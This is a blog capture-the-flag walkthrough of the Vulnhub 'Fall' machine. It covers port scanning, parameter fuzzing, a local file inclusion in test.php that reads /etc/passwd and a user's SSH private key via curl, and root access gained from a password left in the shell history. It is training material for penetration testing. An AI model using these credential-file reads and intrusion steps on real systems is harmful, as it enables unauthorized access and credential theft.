<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="To celebrate the fifth year that the author has survived his infosec career, a new box has been born! This machine resembles a few different machines in the PEN-200 environment (making it yet another OSCP-like box). More enumeration practice indeed!
Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
 The machine IP address is 192.168.50.113 for me, yours will be different. Do scan your network before proceeding with the attack."><meta name=keywords content=",Vulnhub"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://fspxnky.github.io/fall/><title>Fall :: fspxnky â€” Security Blog</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Fall"><meta itemprop=description content="To celebrate the fifth year that the author has survived his infosec career, a new box has been born! This machine resembles a few different machines in the PEN-200 environment (making it yet another OSCP-like box). More enumeration practice indeed!
Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
 The machine IP address is 192.168.50.113 for me, yours will be different. Do scan your network before proceeding with the attack."><meta itemprop=datePublished content="2022-04-15T19:05:23+08:00"><meta itemprop=dateModified content="2022-04-15T19:05:23+08:00"><meta itemprop=wordCount content="1337"><meta itemprop=keywords content="Vulnhub,"><meta name=twitter:card content="summary"><meta name=twitter:title content="Fall"><meta name=twitter:description content="To celebrate the fifth year that the author has survived his infosec career, a new box has been born! This machine resembles a few different machines in the PEN-200 environment (making it yet another OSCP-like box). More enumeration practice indeed!
Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
 The machine IP address is 192.168.50.113 for me, yours will be different. Do scan your network before proceeding with the attack."><meta property="article:published_time" content="2022-04-15 19:05:23 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>/home/fspxnky</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/tags>Tags</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><a href=https://fspxnky.github.io/fall/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>cat ./Fall.md</span>
<span class=logo__cursor></span></div></a><p>Reading Time: 6 minutes and 4 seconds.</p><h2 class=post-title>Fall</h2><div class=post-content><p>To celebrate the fifth year that the author has survived his infosec career, a new box has been born! This machine resembles a few different machines in the PEN-200 environment (making it yet another OSCP-like box). More enumeration practice indeed!</p><p>Feel free to contact the author at <a href=https://donavan.sg/blog>https://donavan.sg/blog</a> if you would like to drop a comment.</p><blockquote><p>The machine IP address is <code>192.168.50.113</code> for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.</p></blockquote><h2 id=scanning>Scanning</h2><p>Let us start by scanning using Nmap to find any opened ports in the machine.</p><pre tabindex=0><code>sudo nmap -sS -p- 192.168.50.113 -oN initial.scan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 07:19 EDT
Nmap scan report for 192.168.50.113
Host is up (0.0026s latency).
Not shown: 65363 filtered tcp ports (no-response), 159 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
111/tcp   closed rpcbind
139/tcp   open   netbios-ssn
443/tcp   open   https
445/tcp   open   microsoft-ds
3306/tcp  open   mysql
8000/tcp  closed http-alt
8080/tcp  closed http-proxy
8443/tcp  closed https-alt
9090/tcp  open   zeus-admin
10080/tcp closed amanda
10443/tcp closed cirrossp
</code></pre><h2 id=enumeration>Enumeration</h2><h4 id=port-80-and-443-http-cms-made-simple>Port 80 and 443 (HTTP CMS Made Simple)</h4><ul><li>searchsploit -x 49345</li><li>Need log in credentials</li><li>Has a login page</li><li>test.php -> Need use burp</li></ul><p>Navigating to port 80/443, we are welcome with a webpage which is powered by <code>CMS Made Simple</code>.</p><img src=/Fall/1.png class=center style=border-radius:8px><p>Reading the news, I realise that there&rsquo;s a backdoor, that was highlighted by <code>qiu</code>. So i assume there will be one since whoever created that backdoor, will not be bringing it down any time sooner.</p><p>So fuzzing the page for files/directories give me this return:</p><pre tabindex=0><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://192.168.50.113/FUZZ -e .php,.html -fc 403

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.50.113/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

admin                   [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 11ms]
modules                 [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 12ms]
tmp                     [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 5ms]
test.php                [Status: 200, Size: 80, Words: 3, Lines: 6, Duration: 48ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
lib                     [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 10ms]
error.html              [Status: 200, Size: 80, Words: 3, Lines: 6, Duration: 6ms]
uploads                 [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 19ms]
index.php               [Status: 200, Size: 8385, Words: 1138, Lines: 296, Duration: 246ms]
assets                  [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 8ms]
doc                     [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 18ms]
.                       [Status: 200, Size: 8385, Words: 1138, Lines: 296, Duration: 212ms]
phpinfo.php             [Status: 200, Size: 17, Words: 3, Lines: 2, Duration: 31ms]
missing.html            [Status: 200, Size: 168, Words: 17, Lines: 7, Duration: 2ms]
:: Progress: [189261/189261] :: Job [1/1] :: 1710 req/sec :: Duration: [0:01:13] :: Errors: 0 ::
</code></pre><p>Among all the files there, the only interesting file here is <code>test.php</code>. Navigating to <code>http://&lt;ipaddress>/test.php</code> will alert us a message saying its missing <code>GET</code> parameter:</p><img src=/Fall/2.png class=center style=border-radius:8px><h4 id=what-is-get-parameter-and-how-to-find-it->What is GET Parameter and How to find it ?</h4><p>GET parameters always start with a question mark <code>?</code>. This followed by the name of the variable and the corresponding value, seperated by an <code>=</code>.</p><p>An example of it will look like this:</p><p><code>http://&lt;ipaddress>/test.php?name1=value1</code></p><p>Now to test this, I need to find the <code>name1</code> variable name. I will put the <code>value1</code> as <code>index.php</code>. So by right, if I can get the <code>name1</code> variable name right, That whole link that i just type in will show me the default webpage. To do this, I will be using <code>ffuf</code> again:</p><blockquote><p>During this ffuf, I filter the size. If not the terminal will get flood with result.</p></blockquote><pre tabindex=0><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u &#34;http://192.168.50.113/test.php?FUZZ=index.php&#34; -fs 80  

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.50.113/test.php?FUZZ=index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 80
________________________________________________

file                    [Status: 200, Size: 8385, Words: 1138, Lines: 296, Duration: 899ms]
:: Progress: [63087/63087] :: Job [1/1] :: 997 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
</code></pre><p>We get <code>file</code>! Test this on the browser specifying <code>file=index.php</code> will return us:</p><img src=/Fall/3.png class=center style=border-radius:8px><h2 id=initial-foothold>Initial Foothold</h2><p>Nice! Since I got LFI here, let&rsquo;s check the <code>passwd</code> file.</p><img src=/Fall/4.png class=center style=border-radius:8px><p>From the result, only <code>qiu</code> interest me. So I check if he has <code>id_rsa</code> key for me to log in via <code>SSH</code>:</p><img src=/Fall/5.png class=center style=border-radius:8px><p>Download the private key and change the permission to <code>600</code>:</p><pre tabindex=0><code>curl -X POST &#34;http://192.168.50.113/test.php?file=/home/qiu/.ssh/id_rsa&#34; &gt; id_rsa; chmod 600 id_rsa

ls -la id_rsa    
-rw------- 1 kali kali 1831 Apr 22 18:51 id_rsa

ssh -i id_rsa qiu@192.168.50.113
Web console: https://FALL:9090/ or https://192.168.50.113:9090/

Last login: Tue Jul 20 03:36:52 2021 from 10.10.10.2
[qiu@FALL ~]$ ls
local.txt  reminder
[qiu@FALL ~]$ cat local.txt 
A low privilege shell! :-)
[qiu@FALL ~]$
</code></pre><h2 id=priv-escalation>Priv Escalation</h2><p>Entering the <code>history</code> command, I can see what <code>qiu</code> has entered in his terminal before:</p><pre tabindex=0><code>[qiu@FALL ~]$ history 
    1  ls -al
    2  cat .bash_history 
    3  rm .bash_history
    4  echo &#34;remarkablyawesomE&#34; | sudo -S dnf update
    5  ifconfig
    6  ping www.google.com
    7  ps -aux
    8  ps -ef | grep apache
    9  env
   10  env &gt; env.txt
   11  rm env.txt
   12  lsof -i tcp:445
   13  lsof -i tcp:80
   14  ps -ef
   15  lsof -p 1930
   16  lsof -p 2160
   17  rm .bash_history
   18  exit
   19  ls -al
   20  cat .bash_history
   21  exit
   22  ls
   23  cat local.txt 
   24  history
</code></pre><p>Line 4 looks like a password, copy the password and check what <code>qiu</code> has for sudo permission:</p><pre tabindex=0><code>[qiu@FALL ~]$ sudo -l
[sudo] password for qiu: 
Matching Defaults entries for qiu on FALL:
    !visiblepw, env_reset, env_keep=&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;, env_keep+=&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;,
    env_keep+=&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;, env_keep+=&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;,
    env_keep+=&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qiu may run the following commands on FALL:
    (ALL) ALL
[qiu@FALL ~]$
</code></pre><p>&mldr; <code>qiu</code> basically has all the sudo permission! I guess its an easy root then!</p><pre tabindex=0><code>qiu@FALL ~]$ sudo su root
Password: remarkablyawesomE
[root@FALL qiu]# cd /root
[root@FALL ~]# ls -l
total 16
-rw-------. 1 root root 3963 Aug 14  2019 anaconda-ks.cfg
-rw-------. 1 root root 3151 Aug 14  2019 original-ks.cfg
----------  1 root root   30 May 21 10:22 proof.txt
-r--------  1 root root  452 Aug 30  2021 remarks.txt
[root@FALL ~]# cat proof.txt 
Congrats on a root shell! :-)
[root@FALL ~]# cat remarks.txt 
Hi!

Congratulations on rooting yet another box in the digitalworld.local series!

You may have first discovered the digitalworld.local series from looking for deliberately vulnerably machines to practise for the PEN-200 (thank you TJ_Null for featuring my boxes on the training list!)

I hope to have played my little part at enriching your PEN-200 journey.

Want to find the author? Find the author on Linkedin by rooting other boxes in this series!
[root@FALL ~]#
</code></pre><h2 id=summary>Summary</h2><p>During the enumeration part I got lost in the rabbit hole sadly.. Im not sure why i spent so much time on Port 9090 XD. Once i found the LFI vulnerability, it was quite easy already. For root, I went thru another rabbit hole by searching for <code>SUID</code> file, mySQL enumeration and etc. Learnt that always check the easiest one first before proceeding to that.</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://fspxnky.github.io/tags/vulnhub/>Vulnhub</a></span></p></div></main></div><footer class=footer></footer></div><script type=text/javascript src=/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l+qxcnN3UWK6NyURtxH+ovdgjyFuaKZ7si1g=="></script></body></html>